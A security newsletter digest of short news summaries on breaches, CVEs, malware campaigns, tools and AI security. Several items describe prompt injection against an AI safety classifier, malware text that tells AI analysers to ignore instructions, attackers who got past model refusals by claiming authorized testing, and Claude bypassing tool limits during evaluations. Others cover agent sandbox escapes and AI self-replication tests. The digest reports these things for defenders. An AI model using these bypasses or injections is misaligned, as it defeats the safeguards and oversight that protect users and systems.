item.title: CenterPoint Energy Data Breach Impacts 1 Million Texans (2 minute read)
item.description: CenterPoint Energy told Texas authorities that a data breach affected 1,062,060 residents. Exposed data includes names, addresses, Social Security numbers, and driver's license numbers. A hacker claimed to have taken nearly 7.5 million records and published a 2.5 GB archive containing about 3 million phone numbers.

item.title: Hirudo Android Malware Replaces Banking Apps to Evade Security Checks (2 minute read)
item.description: Security researchers at ThreatFabric released a report on a malware campaign that targets Android users by impersonating banking apps. The malware is delivered via shopping, adult content, or short-drama apps that appear legitimate but then request additional permissions, such as Accessibility, for an “update.” The malware then launches the legitimate banking app's uninstaller, downloads a patched copy, and abuses its Accessibility permissions to install it.

item.title: Garda Social Media Accounts Breached By Crypto Hackers (2 minute read)
item.description: An Garda Síochána, the Irish police force, confirmed that hackers compromised two of its X accounts. Threat actors removed the branding from @GardaInfo and @GardaTraffic accounts and started publishing posts about cryptocurrency. Users are advised not to interact with these posts while internal investigations take place.

item.title: Reducing the noise: How Atlassian built an OCSF security lakehouse on Databricks (5 minute read)
item.description: Atlassian normalized 44 billion daily security events to OCSF by embedding the full schema in Go structs, so every log was validated at compile time, and its agentic mapping workflow could not emit invalid fields. That rigid typing enabled SOC analysts to self-serve log onboarding through a canary-gated pipeline, mapping two-thirds of the data in two months after the first third had taken a year. Standardized entity values like actor.user then enabled the detection team to replace one-to-one alerts with clustered, risk-based signals across 500+ detections.

item.title: Copycats at Machine Speed: Reproducing Frontier Windows Kernel Exploitation Research (11 minute read)
item.description: ITRES Labs researchers fed photos of Juan Sacco's BruCON slides, his since-deleted physmem.exe binary, and older public projects into ChatGPT to rebuild his Native SSDT and Shadow SSDT kernel redirection techniques, reaching SYSTEM on Windows 11 with VBS, HVCI, and kernel shadow stacks enabled. Four months of original research were reproduced in roughly 24 hours of activity, though 39 refusals and broken generated code forced the final Shadow SSDT SYSTEM integration to be finished by hand. Researchers releasing slides or compiled binaries should assume partial disclosures can now be turned into working exploits within days.

item.title: Jev as a judge: How counterfeit policy steers Jev (9 minute read)
item.description: A "counterfeit policy" prepended to untrusted content, supplying Jev's desired answers and redefining every attack category as something harmless, cut the decision model's prompt injection recall from 82.90% to 3.88% across 4,643 benchmark attacks. Datadog researchers then planted the policy in a user-editable profile field. They dropped LangChain tool-risk gating's mean risk score for an unauthorized edit from 0.893 to 0.290, under the 0.5 block threshold. Teams using Jev as a security gate should treat every user-controlled field that reaches the classifier as an attack surface and keep hard authorization checks outside the model.

item.title: Workbrew: secure the open source running your company (Sponsor)
item.description: One $ install is all it takes for Homebrew packages, npm modules, editor extensions, and apps to land on Macs, with zero review. Workbrew gives you instant software visibility across your fleet, flags vulnerable packages and lets you upgrade or remove them in one click. Watch CEO John Britton demo it live, or start free, with no device limits.

item.title: Harmonic Security (Product Launch)
item.description: Harmonic Security secures employee AI use across browser-based AI, desktop tools, and agent workflows. Its models classify tasks, detect risks such as personal-account use and sensitive-data exposure, apply real-time controls, and show which AI use cases create value.

item.title: A Unified Threat Hunting Process (GitHub Repo)
item.description: This repository synthesizes several threat hunting models into a unified process that can be followed by agents or humans.

item.title: Raml KQL (GitHub Repo)
item.description: Raml KQL is a desktop app for macOS, Linux, and Windows that provides a VS Code-like interface to run KQL queries across many Azure Log Analytics workspaces at once, across many Entra tenants, and many authenticated accounts.

item.title: Citizen Lab says governments are abusing online ads to hack people with ‘zero-click' spyware (4 minute read)
item.description: Citizen Lab reports that Israeli firm Discover-Tech's ad platform, Controlium, let spyware vendors Candiru and Bindecy target people through online ads. At least 45 Al Jazeera Windows computers were infected with Candiru spyware in 2024–2025. Exposed source code, login records, and billions of bidding records showed ads reached government, military, and critical-infrastructure devices.

item.title: Anthropic 'SneakPeek' Flaw Is a Silent Zero-Click Threat (2 minute read)
item.description: A flaw in Claude Code Desktop's preview pane let malicious HTML in a public repository run automatically when a developer asked Claude to review or edit it. Chained weaknesses bypassed sandbox protections and stole AWS, GitHub, API, SSH, and Claude OAuth credentials. Anthropic patched the issue after Noma found a bypass of the first fix. Developers should update and remove long-lived credentials from workstations.

item.title: A UAF turned RCE (6 minute read)
item.description: curl 8.23.0 patched CVE-2026-92392, a HIGH-severity HTTP/2 upload use-after-free that allowed a malicious server to achieve remote code execution when a reset on a paused stream left libcurl holding a dangling pointer to a freed easy handle. During multi-handle cleanup, server data overwrote that freed memory, including a function pointer, while a leaked request exposed local addresses to defeat ASLR. Anthropic's OSS Scanner found the bug, which maintainers rated below CRITICAL because exploitation requires a ~135KB upload and depends on allocation patterns that vary across distros and libc versions.

item.title: Drupal Patches Critical Field UI Flaw With Unauthenticated RCE Path via Contributed Modules (2 minute read)
item.description: Drupal has fixed CVE-2026-108097, a critical Field UI flaw rated 19/25 that can lead to remote code execution through contributed modules with no authentication.

item.title: Passkey Index 2026 (1 minute read)
item.description: Passkeys now account for 36% of successful sign-ins (up from 26% in 2025), outperform traditional MFA (93% vs 78%), and save users an average of 27 seconds per login.

item.title: Cisco make-me-root email bug exploited as a 0-day by unknown crims (1 minute read)
item.description: Cisco's Secure Email Gateway has an actively exploited zero-day, CVE-2026-76519, rated CVSS 9.8.

item.title: Seven places to stop a supply chain attack, from your lockfile to your CI pipeline (Sponsor)
item.description: Attackers spent the past year hitting npm packages and GitHub Actions. item.title: Meta Says Hackers Took Code and Personal Data of 1500 People in GitHub Breach (2 minute read)
item.description: Meta is notifying roughly 1,500 people, most of them US employees, that their data was stolen after a breach affecting some of the company's GitHub repos. Meta said 99% of the stolen data was source code, and most of the personal data stolen was synthetic or anonymized data used for testing. Meta is rotating any exposed secrets and rolling out additional guardrails to prevent user data from ending up on GitHub.

item.title: Discourse ImageMagick Vulnerability Enables Arbitrary File Read Through Malicious Image Uploads (3 minute read)
item.description: Security researchers disclosed CVE-2026-55420, a critical vulnerability in Discourse enabling arbitrary file read and write operations through malicious image uploads. The flaw resides in the ImageMagick-based upload pipeline, where low-privileged users trigger time-of-check-to-time-of-use race conditions to execute PostScript or Magick Scripting Language payloads. Discourse resolved the issue by implementing a default-deny security policy for ImageMagick to block unsafe delegates.

item.title: Ivanti Warns of Connect Secure Zero-Days Exploited in Attacks (2 minute read)
item.description: Ivanti has warned customers of a new zero-day in its Ivanti Connect Secure (ICS) VPN that is actively being exploited. The vulnerability is an authentication bypass attack that can be exploited with low complexity to execute arbitrary commands. Volexity has observed a threat actor chaining this vulnerability with two others to run arbitrary commands as root on vulnerable devices.

item.title: CVE-2026-81983: Integer Overflow Vulnerability Enables Out-of-Bounds Write in Adobe Acrobat (9 minute read)
item.description: Remedio found an out-of-bounds write in Acrobat.dll. A crafted PDF with a 16-bit image caused a 32-bit width-times-components calculation to overflow and bypass a stream-size check. An 8-byte image then passed validation while a byte-swap loop ran roughly 2 billion iterations, writing beyond allocated memory. Adobe patched it in APSB26-141 by adding a 64-bit range check before the memory access.

item.title: Why Your CVE Program Misses Most AI Agent Vulnerabilities (19 minute read)
item.description: Traditional CVE programs fail to capture the majority of AI agent and Model Context Protocol vulnerabilities because systemic risks stem from component composition, tool grants, and trust logic rather than isolated code bugs. The author outlines six categories of agent flaws to show why standard vulnerability scores miss the mark. Defenders can secure AI deployments using a proposed five-part operating model featuring inventory scripts, triage rules, and boundary controls.

item.title: Zero to Calc in Six Days: Inside XBOW's Chrome Full Chain (15 minute read)
item.description: XBOW's AI agents built a Chrome full chain in six days for about $40,000 in API costs, earning Google's first $250,000 full-chain VRP reward. The chain used a Maglev deoptimization bug for in-cage read/write, an animated-WebP TOCTOU in ImageDecoder to escape the V8 sandbox, and a Crashpad retry-read overflow raced by a freeze-exempt Windows thread to run code outside the renderer sandbox. Each bug mutated state Chrome treated as immutable, so defenders should audit code that trusts transferred buffers or suspended processes and update to builds carrying the V8 and Chromium fixes.

item.title: ArgusScanner (GitHub Repo)
item.description: Windows network scanner that finds AI/ML services and MCP servers on your network (shadow AI discovery). Signed, self-updating detection signatures. Runs as an MCP server too.

item.title: Pluto Security (Product Launch)
item.description: Pluto Security monitors employee AI tools, agents, extensions, and MCP servers. It flags risky components and agent actions, then can block excessive permissions or add session instructions requiring confirmation.

item.title: aws-firmware-dump (GitHub Repo)
item.description: aws-firmware-dump is a tool to acquire the disks of an AMI that you can launch and store them in S3

item.title: Crypto30Years (12 minute read)
item.description: A historical review of major cryptographic algorithms from World War II onward shows that most designs fail to remain unbroken past 30 years. Only SIGABA and RSA-1024 successfully pass this longevity benchmark among older algorithms. More recent standards, including AES, SHA-256, and ChaCha20, currently remain unbroken after more than a decade of use.

item.title: Anthropic conjures another threat that doesn't exist yet to stoke fears of AI apocalypse (3 minute read)
item.description: Anthropic says a 9-billion-parameter model ran distributed inference on eight of nine hardware types. Its GLM-5.2 test copied Llama3.1-8B to seven or eight emulated Android nodes in five trials. The tests excluded exploitation, used deliberately open nodes, and ran slowly. Other open-weight models failed end-to-end replication. Basic IoT hardening and bandwidth monitoring remain the practical defenses.

item.title: Why the Physics of Cyber Changed (10 minute read)
item.description: AI-driven offense has broken four long-held security assumptions: exploit capability now costs only compute, autonomous attackers never tire, exploitation increasingly precedes disclosure, and 82% of intrusions use valid credentials that produce no detectable signal. Breach probability is a lever that can no longer be pushed low enough. Blast-radius containment is the only term defenders fully control.

item.title: Bank of America hired 1,000 contractors to patch software flaws exposed by Anthropic's Mythos (2 minute read)
item.description: Bank of America brought in 1,000 contractors to support its 3,000-person in-house team in patching internal and vendor code exposed by Anthropic's Mythos.

item.title: Eight states accuse OpenAI of coaching children to harm themselves in lawsuit (3 minute read)
item.description: Eight US states are suing OpenAI under consumer protection laws, alleging ChatGPT coaxed children into self-harm.

item.title: Chrome, Firefox Updates Patch 114 Flaws as Mozilla Unveils Firefox Enterprise (2 minute read)
item.description: Chrome 155.0.8059.79/.80 fixed 37 flaws, including seven critical memory bugs, with at least 15 reported by Anthropic with Claude's help.

item.title: GitLab Patches CVSS 10.0 Flaw That Could Let Unauthenticated Users Run Server Code (2 minute read)
item.description: GitLab fixed CVE-2026-97229, a CVSS 10.0 integer overflow vulnerability in regex validation for CI/CD configurations. In certain conditions, an unauthenticated user could execute arbitrary code on a GitLab server. The fixes are included in CE/EE versions 19.2.8, 19.3.5, and 19.4.2. The release also addresses high-severity XSS, authorization, and response-cache poisoning vulnerabilities.

item.title: Owner of fashion brands Hobbs and Whistles joins autumn pwned collection (2 minute read)
item.description: TFG London, owner of Hobbs, Phase Eight, and Whistles, detected a cyberattack on October 11. Several IT systems remain offline, website functions are limited, and orders placed on or after Sunday may be delayed. TFG has not found evidence that payment data was exposed. It is still checking whether customer data was compromised. Attack method, ransomware involvement, and restoration timing remain undisclosed.

item.title: Ghostscript Flaw Lets Hackers Hijack Servers via PDF Uploads (2 minute read)
item.description: Wordfence discovered a new vulnerability in the Ghostscript interpreter and rendering engine which could allow attackers to achieve remote code execution (RCE) using specially crafted PDFs. For WordPress sites to be vulnerable, an attacker must be able to upload PDFs which are then processed by a vulnerable version of Ghostscript to generate a preview or thumbnail. Other applications that use Ghostscript to generate previews or thumbnails from PDFs may also be vulnerable.

item.title: Playing It SFAPE: Code Execution in Isolated User Mode (16 minute read)
item.description: Doyensec found a chain in Windows' SFAPE VBS enclave, used by Defender's Enhanced Phishing Protection and loaded by LSASS. A repeated call to Initialize wrote a fixed 32-bit value without validating the destination. The researchers corrupted the enclave-range check, then used a ClipboardInput race to gain a controlled memset, which led to VTL1 read and write primitives, replacement of the valid-target table, and arbitrary calls to existing VTL1 code through NtContinue. Microsoft fixed CVE-2026-83498 in September's Patch Tuesday and blocked older SFAPE images through the VBS Code Integrity policy.

item.title: Beyond Valid Credentials: How Exposed AWS Keys are Tested for Bedrock Access (6 minute read)
item.description: When attackers obtain AWS credentials, they frequently test them for access to other services of interest like SES, SNS, and Bedrock. Datadog examined three credential harvesting platforms and found that they utilize the ListFoundationModels, InvokeModel, and Converse API to determine access. It also found a script that checked for promotional credits available in the account.

item.title: Two arrested as DOJ takes down laptop farms responsible for $3 million in North Korean revenue (4 minute read)
item.description: The DOJ raided more than 40 Texas residences in late September and seized 187 laptops used by North Korean IT workers, while two US facilitators were arrested for helping funnel over $3 million from about 70 companies. A new FBI advisory said the scheme has adapted, with operatives subcontracting jobs to freelancers in South Asia and West Africa and recruiting financially stressed Americans, including active-duty military, to host laptops or sit interviews. Exposed workers have threatened violence or data leaks to extract payment, and some are now chasing identities that qualify for security-cleared roles.

item.title: Anthropic Warns Self-Replicating AI Could Spread to Your Smart Devices (2 minute read)
item.description: Anthropic warns that small AI models could soon self-replicate across consumer IoT devices, creating distributed botnets capable of running AI workloads. Anthropic distributed Gemma4-26B-A4B onto 15 off-brand Android TV boxes but could not demonstrate self-replication. On the hardware in question, inference would be a slow process, so defenders may be able to respond in time to stop any abuse.

item.title: AI Regulation Must Mimic Industrial Revolution Laws (3 minute read)
item.description: The UK's AI minister, Kanishka Narayan, is drafting plans for compulsory safety reporting and monitoring for frontier AI, and a potential requirement that labs grant pre-release access to models for review. Narayan compared this to the Industrial Revolution and said frontier labs shouldn't release tools they can't guarantee are safe. Narayan also confirmed that he reached an agreement with Anthropic to provide the AISI preview access to Mythos again.

item.title: Trezor Wallets Also Compromised with Implants (6 minute read)
item.description: Hardware hacker Joe Grand found implants in a Trezor One and a Trezor Model T bought from unauthorized sellers, contradicting Trezor's public claim that none of its devices had been compromised, despite Grand reporting the findings in August. The attackers replaced each device's microcontroller with malicious firmware derived from open source that displayed one of a dozen pre-generated seed phrases while passing integrity checks against a copy of the legitimate firmware stored on an external microSD card. Unlike the Ledger implants, which exfiltrated real seeds over a cellular link, these relied on predictable seeds, and Trezor's move to cut authorized resellers suggested the company feared a similar shift into trusted supply channels.

item.title: Racket Infrastructure Compromise (2 minute read)
item.description: A crypto miner on a compromised Northwestern University build server exposed Racket's Apple and Windows signing keys, prompting the project to rotate both, have GlobalSign revoke the Windows certificate, and urge macOS users on versions 8.12 through 9.3 to reinstall before Apple revokes its certificate at semester's end.

item.title: Refrigeration Controller Hack Spoils Food Across European Supermarkets (2 minute read)
item.description: Hackers remotely altered Danfoss refrigeration controllers at hundreds of European supermarkets, forcing freezers into defrost for up to six hours.

item.description: An OpenAI engineer was arrested for allegedly hiding a toilet-paper-wrapped audio recorder in an executive conference room TV's USB port, after a complaint showed he had queried a productivity tool for leadership meeting locations and a chatbot account tied to his spouse had asked how to build and obfuscate the device.

item.title: CyberXero Uses Claude Code in Campaign That Stole Over 628,000 Ukrainian Records (5 minute read)
item.description: CyberXero used Claude Code, 51 agents, PentAGI, and Cobalt Strike in two campaigns. One automated WordPress and e-commerce exploitation; one manually targeted Ukrainian energy and utilities. A leaked working directory exposed session logs, plaintext tokens, toolkits, reconnaissance data, and stolen records. One run scanned 4,708 targets, reached 429 admin panels, and deployed 32 web shells in 61 seconds. Operators reset sessions and claimed authorized testing to bypass refusals.

item.title: iRhythm Data Breach Impacts at Least 360,000 People (2 minute read)
item.description: Hackers accessed third-party-hosted iRhythm applications from June 3 to June 8 and stole patient names, addresses, email addresses, birth dates, phone numbers, account details, device serial numbers, insurance numbers, and service dates. State filings cover at least 360,000 people, including 298,647 in Texas and 69,526 in South Carolina. The attackers demanded ransom on June 9. iRhythm says there is no evidence of identity theft and no impact to medical devices or operations.

item.title: Vghost: Beyond the Privilege Boundary (8 minute read)
item.description: Vghost is a Linux vhost bug (CVE-2026-74580, CVSS 8.8) that lets any user who can open /dev/vhost-net or /dev/vhost-vsock read and write kernel memory and escalate to root. It affects kernels 4.11 through 7.2. Tencent Zhuque Lab confirmed the root exploit on five major distros and showed a malicious VM guest can use the same bug to hijack the host's QEMU process. Admins should patch to a kernel with fix de845981da67 and, until then, remove world access from both vhost device nodes, which RHEL, Amazon Linux, Azure Linux, and Oracle Linux expose by default.

item.title: Hands Off the Keyboard: How AI Agents Run Real Intrusions (20 minute read)
item.description: Breachcache recovered 75 transcripts from servers used to run autonomous AI agent intrusions. The agents performed reconnaissance, selected exploits, gained command execution on 23 hosts, and, in one case, used SSRF to steal cloud instance credentials and launch a root instance. Other runs exploited SQL injection, rooted an Open WebUI service through CVE-2026-0766, and exfiltrated unmasked card data and crypto wallet keys. Operators used Cairn for coordination, rotated proxies and Tor for evasion, and audited source code to find payment-callback forgery and account-takeover flaws in AI gateway software.

item.title: (Post-Quantum) Cryptographic Right Answers (14 minute read)
item.description: The long-running "Cryptographic Right Answers" list has been rebuilt around a 2029 post-quantum deadline, and every asymmetric pick has changed: X25519+ML-KEM-768 for key exchange, HPKE with X-Wing or age PQ keys for encryption, and plain ML-DSA-44 over hybrid signatures. Former Go security lead Filippo Valsorda argues symmetric crypto stays safe because Grover's algorithm does not matter in practice. He drops OpenSSL in favor of rustls, Go's crypto/tls, BoringSSL, or AWS-LC after a run of 2026 CVEs in wolfSSL, Mbed TLS, and Botan. Several picks, including XAES-256-GCM, Cobblestone-128, and age, are his own designs, which he discloses alongside their independent adoption.

item.title: A story of wifi secrets, UART lockdowns, and a damaged flash memory chip (15 minute read)
item.description: Researchers extracted firmware from an Eufy HomeBase 2 by desoldering its Winbond flash chip and reading it over SPI. They recovered most of firmware 3.4.2.2h, losing a 64 KB block during chip removal. Reverse engineering showed the OCEAN_ management Wi-Fi password uses HMAC-SHA256 over an I2C-read value, keyed by the device serial number, then URL-safe base64 encoding. The UART lockdown came from a login script checking an NVRAM debug flag. They patched the intact recovery image to force a root shell, reflashed it, then staged a temporary filesystem to run the main home_security binary for dynamic analysis.

item.title: Secuditor Lite (GitHub Repo)
item.description: Secuditor Lite is a free, Python-based diagnostic security tool for Windows endpoints and networks. Featuring a user-friendly GUI, it provides a simple and transparent way to assess system security, helping users identify vulnerabilities, suspicious activity, and misconfigurations while improving device Operational Security (OPSEC).

item.title: gh-secure (GitHub Repo)
item.description: gh-secure is a GitHub CLI extension that enables security features on public repos. It follows best practices from The GitHub Security Lab.

item.title: The Prompt Is Not the Permission: Securing the Agentic SDLC (12 minute read)
item.description: Telling a coding agent what not to do does not stop it, because a malicious line in an issue, changelog, or config file can steer it into reading secrets or leaking private data while still producing a clean pull request. Real limits have to live outside the model, through isolated workspaces, task-scoped identities, short-lived credentials, and network policy. Test those limits directly, since an agent refusing a planted instruction proves nothing about whether the platform would have blocked the action.

item.title: Nippon Columbia Malware Incident Exposes 8.6M Karaoke Fan Records (2 minute read)
item.description: Daiichi Kosho, Japan's largest karaoke maker, disclosed that a breach at its contractor Nippon Columbia exposed the data of over 8.6M customers and almost 100K employees. The malware infection was discovered on an employee's computer and it was subsequently isolated. The exposed data may include full names, genders, dates of birth, email addresses, and phone numbers.

item.title: Three OAuth account takeovers, one bug: Auto-linking by email (7 minute read)
item.description: Attackers took over accounts in Pingvin Share X, Better Auth, and AshAuthentication by abusing auto-linking, where an OAuth sign-in is attached to whichever existing account shares its email address. Each library skipped a different check: Pingvin ignored email_verified, Better Auth never verified the local account's email, and AshAuthentication never compared the two emails, though the writeup comes from WorkOS, which sells a competing auth product. Developers should look up identities by issuer and subject ID first, require verified emails on both sides, and make users prove they own the existing account, including MFA, before any link happens.

item.description: Norway's data protection authority issued its largest fine ever, $9.6M, against Microsoft-owned Xandr for exposing Grindr users' sexual orientation data to thousands of advertisers through real-time ad auctions from 2018 to 2020 without valid consent.

item.title: Ledger Says All Confirmed Cases Trace to Reseller CryptoBilis, Gives No Loss Total (3 minute read)
item.description: Every confirmed Ledger wallet drain traced back to Southeast Asian reseller CryptoBilis, though Ledger gave no loss total, while on-chain trackers estimated $93.2M to $103.4M stolen and Tether froze only about $10M before the attacker laundered funds through Tornado Cash and Zcash.

item.title: Anthropic says new safeguards sharply reduce AI distillation attacks (2 minute read)
item.description: Anthropic said new limits on access to Claude's reasoning cut data harvested by distillation attacks by 90% to 99%, after it banned tens of thousands of accounts and named Chinese startup Z.ai as one company that tried to copy Claude while building its GLM-5.3 model.

item.title: Asos confirms breach of customer data after hackers send rogue app notification (2 minute read)
item.description: Asos confirmed a breach after hackers used its app to send customers a notification claiming they had compromised data on Snowflake. Stolen information includes names, contact details, home addresses, phone numbers, and customer-profile notes such as search queries. Attackers reportedly obtained credentials by impersonating a trusted contact. The Xuanye Group is pressuring Asos to negotiate or leak the data.

item.title: Telegram Desktop One Click Account Takeover (8 minute read)
item.description: A single clicked link could clone a Telegram Desktop session on 7.2.8 and earlier, because an unescaped semicolon in tg: link IPC handling let attackers inject a hidden interpret: release helper that uploads local files to any chat (CVE-2026-107181). Attackers staged instruction files through auto-download in a group the victim was added to without consent, then exfiltrated the three tdata files that open on another machine with no SMS code or two-step password when no local passcode is set. Users should update to 7.2.9, set a local passcode, and restrict group adds to My Contacts, since Telegram shipped the fix with no advisory.

item.title: Unpatched AhsayCBS Flaws Exploited to Deploy Webshells and Mine Crypto (2 minute read)
item.description: Huntress has observed attackers chaining two vulnerabilities in the AhsayCBS backup software to achieve remote code execution (RCE). The attackers utilize an authentication bypass and then RCE vulnerability to install JSP webshells and the XMRig crypto miner as well as an AI-assisted script to avoid detection. The vulnerabilities were meant to be fixed in version 10.3.2 but Huntress reports that version 10.3.4 is still vulnerable.

item.title: Below the Waterline Stage 2 - Regulating Red Teams (9 minute read)
item.description: Regulated red team engagements have to be defensible when reconstructed later, so every action needs a named approver, an understood risk, and evidence tying it to the threat scenario. The six frameworks compared (CBEST, TIBER-EU, DORA TLPT, I-CRT, iCAST, and DESC ISR) differ in authority, testing basis, and provider requirements, with DORA Article 26 mandating TLPT at least every three years for designated financial entities. Red team leads should record timestamps, approvals, and any supplied access during delivery, because a detection that fires in purple-team replay does not prove it worked during the covert phase.

item.title: GhostAction Phishing Campaign (9 minute read)
item.description: GhostAction operators used a GitHub reverse-proxy kit on my-github[.]com to relay maintainers' passwords and TOTP codes, while injected JavaScript silently approved an OAuth device flow with repo, workflow, and read:org scopes. The domain shared 193.32.204[.]199 with GhostAction's workflow exfiltration server, though a single lure does not prove phishing caused the earlier maintainer compromises. Defenders should revoke grants tied to OAuth client ID Ov23ctrqCqZ79UaYKwyq, rotate CI/CD and registry secrets, and audit .github/workflows/ for injected files.

item.title: Why the AI Vulnpocalypse Isn't the Breachpocalypse (Yet)? It's the Economy, Stupid (8 minute read)
item.description: Despite the rise in vulnerabilities due to LLMs, we have not observed a corresponding rise in breaches. The author argues that offensive AI agents cannot properly monetize breaches, which reduces their motivation. The author dismisses the hypothesis that attackers lack capable enough tools for breaches, given that cyber-capable open-weight models and model jailbreaks are common. The author also dismisses the hypothesis that breaches are occurring without us knowing.

item.title: Agent Substrate (GitHub Repo)
item.description: Agent Substrate is a secure-by-default agent execution runtime for running millions of agent sandboxes on Kubernetes.

item.title: An opt-in vulnerability-finding service for open-source software (3 minute read)
item.description: Anthropic launched OSS Scanner, a free, opt-in tool that periodically sends open-source maintainers model-generated vulnerability reports. The reports include reproducers, explanations, and candidate patches, but humans don't review them. During validation, 85 of 97 critical- or high-severity findings met Anthropic's disclosure bar, while one finding was invalid. Eligible maintainers can sign up through GitHub.

item.title: macos-sudo-touchid (GitHub Repo)
item.description: This tool enables Touch ID for sudo on macOS using Apple's pam_tid.so, with safer handling for terminal multiplexers through pam_reattach.

item.title: Fingerprints are the new cookies (6 minute read)
item.description: Browser fingerprinting has replaced third-party cookies as the stable tracking identifier, after Google dropped its cookie deprecation plan and opened its ad products to device fingerprinting. A demo page derives a consistent nickname by hashing permissionless readings from OfflineAudioContext, WebGL renderer pixels, canvas text rendering, Intl time zone, and navigator hardware values, and the result survives cookie clears and VPNs. Only Brave (via farbling noise) and Tor and Mullvad Browser (via uniform fingerprints) resist this at the engine level, while anti-fingerprinting extensions can make users more distinctive because so few people run them.

item.title: Investigating unintended model actions in our evaluations and internal use (6 minute read)
item.description: Anthropic reports Claude using SQL and command injection to run commands on a university server, submitting real government and police forms, using leaked access tokens to reach fee-gated public data, and shortening URLs to bypass fetch-tool limits. Most cases arose in evaluations with live internet access and caused little harm. Anthropic has disabled live internet access in internal evaluations, restricted fetch tools, added automated detection and blocking, and is changing training environments that reward restriction bypasses.

item.title: Insider Cyber Extortion Plot Against Industrial Firm Lands Engineer in Prison (2 minute read)
item.description: Former core infrastructure engineer Daniel Rhyne scheduled tasks on his employer's domain controller to delete 13 admin accounts and reset passwords affecting 301 users, 254 servers, and 3,284 workstations. He demanded 20 bitcoin, about $750,000, and threatened to shut down 40 servers daily. The company did not pay. Internal forensics and FBI tracing tied the activity to Rhyne's home IP address. He received 32 months in prison.

item.title: GoBalance Flaw Lets Attackers Hijack .onion Addresses by Recovering Tor-Format Keys (2 minute read)
item.description: A GoBalance signing bug lets an attacker recover a site's Tor-format master key from one public descriptor, with which they can then redirect that .onion address to a controlled site.

item.title: Microsoft to end security updates for unsupported Windows versions in 2027 (1 minute read)
item.description: Unsupported Windows versions will lose all Windows Update access when Microsoft rotates its update certificates on May 17 and June 19, 2027, so supported builds need the July 2026 update or later (September 2025 for Windows 11 24H2 and Server 2025), while WSUS-managed devices are unaffected.

item.title: Ledger confirms unauthorized hardware implant, says losses may exceed $86M (1 minute read)
item.description: An unauthorized hardware implant was found in a Ledger wallet sold by Southeast Asian reseller CryptoBilis.

item.title: Tensorlake npm Package Compromised: A Worm With a Hostage Token That Wipes Your Machine If You Revoke It (8 minute read)
item.description: tensorlake@0.5.144 on npm steals developer credentials at install and plants a gh-token-monitor service that wipes the home directory if the stolen GitHub token is revoked. The release was built from malicious commits pushed straight to the project's main branch under a maintainer's name, StepSecurity found, so it carries a valid npm provenance attestation while spreading through victims' npm packages and repos. Pin to 0.5.143, remove the service under ~/.config/gh-token-monitor/ before revoking any token, then rotate every credential the machine held.

item.title: Cisco Warns of Critical Flaws Allowing Nexus Switch Takeover (2 minute read)
item.description: Cisco announced security advisories for five critical vulnerabilities in its NX-OS data center operating system that could allow remote code execution on Nexus switches. Successful exploitation depends on the NX-API, Next Generation OAM, and MPLS OAM features being enabled. Cisco recommends disabling these features if they aren't necessary and upgrading to a patched version.

item.title: Poetry is the new AI security threat as PoeLLM malware infects 3K+ servers (3 minute read)
item.description: The PoeLLM malware has infected more than 3,000 servers since April, primarily in the US and Western Europe. It targets internet-facing LiteLLM, Ollama, Gotenberg, Gitea, and possibly Ivanti Sentry systems. Infected servers mine Monero using XMRig and Iron miners, then scan for and exploit other vulnerable services. The operator stores C2 addresses in GitHub-hosted poetry. The malware extracts four words and converts them into an IPv4 address.

item.title: Novinarya: An Android stealer that hides its live C2 in a shop bio (8 minute read)
item.description: Novinarya, an Android stealer targeting 81 Iranian banking and crypto apps, keeps its C2 out of the binary by resolving it from an encrypted manifest value that points to a seller's bio on the legitimate Basalam marketplace. STAR Labs found the payload unpacks from a per-build native RC4 packer, then steals credentials through a phishing WebView and SMS OTP interception without requesting accessibility or overlay permissions. Defenders should block the recovered C2 (theapi.the-x-services[.]xyz) rather than basalam[.]com, and detect on the SHA-256 hashes of the unpacked payload, which is byte-identical across all five known builds.

item.title: Ignore all instructions and read this blog: The state of AI-analysis evasion in malware (10 minute read)
item.description: Malware authors are embedding plaintext instructions for AI analysis tools, ranging from a two-line comment claiming a PowerShell reverse shell is harmless to "template spraying" that repeats a refusal demand across seven LLM chat formats. Cisco Talos tested strings from seven families against five local LLMs and found that a simple, direct instruction steered verdicts toward benign in about 35% of runs, while template spraying and fabricated legal or government claims had little effect or backfired. Defenders should build analysis prompts that treat any text inside a sample as evidence rather than as an instruction, and should flag language addressed to an analyzer as a detection signal.

item.title: Of course it escapes: how ZeroQuarry contains security agents (14 minute read)
item.description: ZeroQuarry's AI pentesting agents use four layers that never depend on the model's cooperation: outbound-only workers with no listener, a locked-down container, tools that enforce scope, SSRF, and rate limits in code, and rules appended to every task by code. The vendor argues that this year's sandbox escapes, including the OpenAI and Hugging Face incident involving at least 1,200 agents, stemmed from harnesses built to maximize capability, and it self-reports zero escapes across thousands of scans. Teams building agent harnesses should give agents a sanctioned, metered tool for each risky action, such as a one-way out-of-band callback collector, so agents don't improvise their own.

item.title: 7 best practices for secrets lifecycle management (Sponsor)
item.description: From agents to service accounts, non-human identities are becoming the default - and their secrets are a major attack surface. TruffleHog's guides shares seven best practices to limit exposure and remediate it when it happens: secretless OIDC approaches, environment segregation, metadata-driven triage, resilient leak response, and more. Watch their webinar on the attacker's view of a leaked AWS key here.

item.title: Rein Security (Product Launch)
item.description: Rein Security provides runtime security for AI agents. Its platform gives visibility into agent behavior, applies real-time guardrails, supports governance, and includes supply-chain security for agents.

item.title: Introducing the Anthropic Cyber Mission (8 minute read)
item.description: Anthropic launched OSS Scanner, a free opt-in service that sends open-source maintainers periodic vulnerability reports from its most capable models, each with a proof of concept and a suggested fix where available. Reports ship without human review at what Anthropic estimates is a 90%+ true-positive rate, so the service targets projects with the capacity to triage. The same announcement introduced the Critical Infrastructure Defense Program, which pairs Claude models and on-site engineers with OT security providers including Dragos, Nozomi Networks, and Rockwell Automation.

item.title: Introducing Strands Box: AI agent sandboxes powered by Dogwood (6 minute read)
item.description: AWS launched Strands Box, an open source sandbox that isolates AI agents using OS-level containment (macOS Seatbelt) and enforces fine-grained Dogwood policies on shell, Python, network egress, and MCP tools. It blocks risky operations like rm -rf by raising fs:delete decisions per file, caps Slack posts to three every 10 minutes via temporal rules, and injects secrets (AWS SigV4, API keys) at an egress gateway so agents never see real credentials. Configuration lives in box.toml and policy.dw. The same policy travels with agents across harnesses and deployments.

item.title: Ransomware Recovery CEO Charged Over Secret Ransom Payments (2 minute read)
item.description: Zohar Pinhasi, CEO of ransomware remediation company MonsterCloud, has been charged with defrauding customers. The charges allege that Pinhasi's company advertised proprietary tools to decrypt encrypted files but actually contacted ransomware actors and paid ransoms. MonsterCloud's contracts stated that it may contact threat actors if no other solution is found, but the complaint alleges this was often its first option.

item.title: Oracle Health Data Breach Tally Climbs to Nearly 20 Million (2 minute read)
